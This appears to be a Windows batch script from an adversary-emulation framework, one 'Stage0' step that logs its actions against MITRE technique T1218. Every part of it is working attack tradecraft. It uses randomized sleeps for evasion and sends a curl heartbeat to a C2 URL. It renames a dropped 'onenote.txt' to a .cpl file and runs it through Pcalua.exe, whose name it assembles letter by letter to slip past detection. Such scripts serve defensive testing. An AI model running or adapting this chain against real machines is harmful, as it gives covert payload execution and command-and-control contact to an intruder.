@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ constants (plain literals - NEVER encoded)
SET yktnwwf=%APPDATA%\8945\4302a7e3
SET fpakbq=Macula-Stage0-8945
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8945-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=onenote.txt
SET fpldhe=8945

REM Logging variables
SET zpmkgq=%APPDATA%\!yydue!\macula-simulations.log
SET rplgn=!omxgazu!
SET dsvhgr=T1218
SET wqvybm=Signed Binary Proxy Execution

REM Initial delay
echo [!DATE! !TIME!][DEBUG][!rplgn!]: initial_delay_start>> "!zpmkgq!" 2>nul
SET /A uijhkl=%RANDOM% %% 10 + 10
timeout /t !uijhkl! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!rplgn!]: initial_delay_end>> "!zpmkgq!" 2>nul

REM C2 heartbeat (non-obfuscated)
echo [!DATE! !TIME!][DEBUG][!rplgn!]: heartbeat_start>> "!zpmkgq!" 2>nul
curl -k -s -o nul "!rdzgrnne!"
echo [!DATE! !TIME!][DEBUG][!rplgn!]: heartbeat_end>> "!zpmkgq!" 2>nul

REM Delay between operations
ping -n 7 127.0.0.1 >nul

REM Change to output directory
echo [!DATE! !TIME!][DEBUG][!rplgn!]: chdir_start=!yktnwwf!>> "!zpmkgq!" 2>nul
cd /d "!yktnwwf!"
echo [!DATE! !TIME!][DEBUG][!rplgn!]: chdir_end>> "!zpmkgq!" 2>nul

REM Delay
CHOICE /C Y /N /D Y /T 8 >nul

REM Rename DLL to CPL
echo [!DATE! !TIME!][DEBUG][!rplgn!]: rename_start=!edjwtl!>> "!zpmkgq!" 2>nul
SET tpmue=0&SET xzlp=
IF EXIST "!edjwtl!" (
    ren "!edjwtl!" pcafile.cpl
    IF NOT ERRORLEVEL 1 SET tpmue=1
) ELSE SET xzlp=file_missing
echo [!DATE! !TIME!][DEBUG][!rplgn!]: rename_end=!tpmue!>> "!zpmkgq!" 2>nul

REM TTP logging for file rename preparation
FOR /F "tokens=2 delims==" %%i IN ('wmic os get localdatetime /value') DO SET dt=%%i
SET grtgx=!dt:~0,4!-!dt:~4,2!-!dt:~6,2! !dt:~8,2!:!dt:~10,2!:!dt:~12,2!.!dt:~15,3!
echo [!grtgx!][!rplgn!]: !yydue!-!fpldhe!-!dsvhgr!|!wqvybm!=!tpmue!:!xzlp!>> "!zpmkgq!" 2>nul

IF !tpmue! EQU 0 ENDLOCAL&exit /b

REM Delay
SET /A wkjtyr=%RANDOM% %% 15 + 5
timeout /t !wkjtyr! /nobreak >nul

REM Obfuscated LOLBin (character-by-character assembly)
echo [!DATE! !TIME!][DEBUG][!rplgn!]: lolbin_build_start>> "!zpmkgq!" 2>nul
SET clvz=P
SET ikfb=c
SET ztmx=a
SET vknt=l
SET byrj=u
SET zfpx=a
SET qbtw=.
SET okls=e
SET flrz=x
SET utqe=e
SET jwpt=!clvz!!ikfb!!ztmx!!vknt!!byrj!!zfpx!!qbtw!!okls!!flrz!!utqe!
echo [!DATE! !TIME!][DEBUG][!rplgn!]: lolbin_build_end=!jwpt!>> "!zpmkgq!" 2>nul

REM Execute with obfuscated LOLBin
echo [!DATE! !TIME!][DEBUG][!rplgn!]: execution_start=!jwpt!>> "!zpmkgq!" 2>nul
SET prkyt=0&SET yhwbf=
!jwpt! -a "pcafile.cpl"
IF ERRORLEVEL 1 SET yhwbf=execution_failed
IF NOT ERRORLEVEL 1 SET prkyt=1
echo [!DATE! !TIME!][DEBUG][!rplgn!]: execution_end=!prkyt!>> "!zpmkgq!" 2>nul

REM TTP logging for execution
FOR /F "tokens=2 delims==" %%i IN ('wmic os get localdatetime /value') DO SET dt=%%i
SET grtgx=!dt:~0,4!-!dt:~4,2!-!dt:~6,2! !dt:~8,2!:!dt:~10,2!:!dt:~12,2!.!dt:~15,3!
echo [!grtgx!][!rplgn!]: !yydue!-!fpldhe!-!dsvhgr!|!wqvybm!=!prkyt!:!yhwbf!>> "!zpmkgq!" 2>nul

REM Final delay
ping -n 12 127.0.0.1 >nul
ENDLOCAL